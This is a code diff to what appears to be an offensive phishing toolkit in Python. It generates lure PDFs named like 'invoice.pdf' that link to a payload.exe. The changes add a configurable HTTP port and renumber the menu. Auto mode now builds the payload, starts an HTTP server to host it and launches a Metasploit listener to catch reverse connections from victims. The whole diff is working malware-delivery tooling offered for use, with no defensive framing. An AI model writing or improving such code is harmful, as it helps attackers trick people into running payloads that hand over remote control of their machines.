@@ -18,6 +18,7 @@ from modules.server import serve_file, get_local_ip
 CFG = {
     "lhost": None,
     "lport": 4444,
+    "http_port": 8080,
     "payload_id": "1",
     "lure_id": "1",
     "output_name": "invoice.pdf",
@@ -68,7 +69,7 @@ def print_config():
     pname = PAYLOAD_MAP.get(CFG["payload_id"], ["unknown"])[1]
     mname = METHODS.get(CFG["method"], ["unknown"])[0]
     lname = LURE_TEMPLATES.get(CFG["lure_id"], {}).get("title", "N/A")
-    print(f" LHOST: {lhost}          LPORT: {CFG['lport']}")
+    print(f" LHOST: {lhost}          LPORT: {CFG['lport']}   HTTP: {CFG['http_port']}")
     print(f" Payload: {pname} ({CFG['payload_id']})")
     print(f" Method: {mname} ({CFG['method']})")
     print(f" Lure: {lname} ({CFG['lure_id']})")
@@ -87,9 +88,10 @@ def show_menu():
     print("│  [4]  Configure LHOST / LPORT                │")
     print("│  [5]  Select Lure Template                   │")
     print("│  [6]  Set Output Filename                    │")
-    print("│  [7]  Start Metasploit Listener              │")
-    print("│  [8]  Stop Listener                          │")
-    print("│  [9]  Serve PDF via HTTP                     │")
+    print("│  [7]  Set HTTP Port                          │")
+    print("│  [8]  Start Metasploit Listener              │")
+    print("│  [9]  Stop Listener                          │")
+    print("│  [10] Serve PDF via HTTP                     │")
     print("│  [A]  Auto Mode (All-in-One)                 │")
     print("│  [Q]  Quit                                   │")
     print("└─────────────────────────────────────────────┘")
@@ -139,12 +141,12 @@ def cmd_generate_pdf():
     elif method == "3":
         print("[*] Method: PDF + Download Link")
         ip = lhost if lhost else get_local_ip()
-        port = CFG["lport"] + 1
-        payload_url = f"http://{ip}:{port}/payload.exe"
+        http_port = CFG["http_port"]
+        payload_url = f"http://{ip}:{http_port}/payload.exe"
         result = generate_simple_pdf_with_link(payload_url, output_name, CFG["lure_id"])
         if result:
             print(f"[+] SUCCESS: {result}")
-            print(f"[*] Remember to: (1) Build payload, (2) Start HTTP server on port {port}")
+            print(f"[*] Remember to: (1) Start HTTP server (option 10), (2) Payload builds automatically")
             print(f"[*] The PDF contains a link to: {payload_url}")
 
     input("\nPress Enter...")
@@ -233,19 +235,25 @@ def cmd_start_listener():
     start_listener(rc)
 
 
+def cmd_set_http_port():
+    print(f"\n Current HTTP port: {CFG['http_port']}")
+    port = input(f"HTTP server port [{CFG['http_port']}]: ").strip()
+    if port.isdigit():
+        CFG["http_port"] = int(port)
+        print(f"[+] HTTP port set to: {CFG['http_port']}")
+    input("Press Enter...")
+
+
 def cmd_stop_listener():
     stop_listener()
     input("Press Enter...")
 
 
 def cmd_serve():
-    port = input("HTTP port [8080]: ").strip() or "8080"
-    try:
-        port = int(port)
-    except:
-        port = 8080
+    port = CFG["http_port"]
+    print(f"[*] Using HTTP port: {port}")
 
-    # Also build payload for download method
+    # Build payload for download method
     if CFG["method"] == "3" and CFG["lhost"]:
         build_payload(CFG["payload_id"], CFG["lhost"], CFG["lport"], "payload.exe")
 
@@ -286,19 +294,28 @@ def cmd_auto_mode():
         print("[*] Building payload for download...")
         pay_path = build_payload(CFG["payload_id"], lhost, CFG["lport"], "payload.exe")
         ip = lhost
-        port = CFG["lport"] + 1
-        payload_url = f"http://{ip}:{port}/payload.exe"
+        http_port = CFG["http_port"]
+        payload_url = f"http://{ip}:{http_port}/payload.exe"
         result = generate_simple_pdf_with_link(payload_url, CFG["output_name"], CFG["lure_id"])
 
     if result:
         print(f"\n[+] PDF generated: {result}")
         print(f"[*] File size: {os.path.getsize(result)/1024:.1f} KB")
 
+    # Auto-start HTTP server for method 3
+    if CFG["method"] == "3":
+        import threading
+        import time
+        http_thread = threading.Thread(target=serve_file, args=(CFG["http_port"],), daemon=True)
+        http_thread.start()
+        time.sleep(1)
+        print(f"[*] HTTP server started on port {CFG['http_port']}")
+
     print("\n[*] Starting Metasploit listener...")
     p = PAYLOAD_MAP.get(CFG["payload_id"])
     rc = generate_rc(p[0], lhost, CFG["lport"])
-    print("[*] Listener ready. Use option 9 to serve PDF via HTTP.")
     print(f"[*] PDF location: {result}")
+    print(f"[*] Download URL: http://{lhost}:{CFG['http_port']}/payload.exe")
 
     input("\nPress Enter to start listener or Ctrl+C to abort...")
     start_listener(rc)
@@ -316,9 +333,10 @@ def main():
             "4": cmd_configure,
             "5": cmd_select_lure,
             "6": cmd_set_output,
-            "7": cmd_start_listener,
-            "8": cmd_stop_listener,
-            "9": cmd_serve,
+            "7": cmd_set_http_port,
+            "8": cmd_start_listener,
+            "9": cmd_stop_listener,
+            "10": cmd_serve,
             "A": cmd_auto_mode,
         }
 
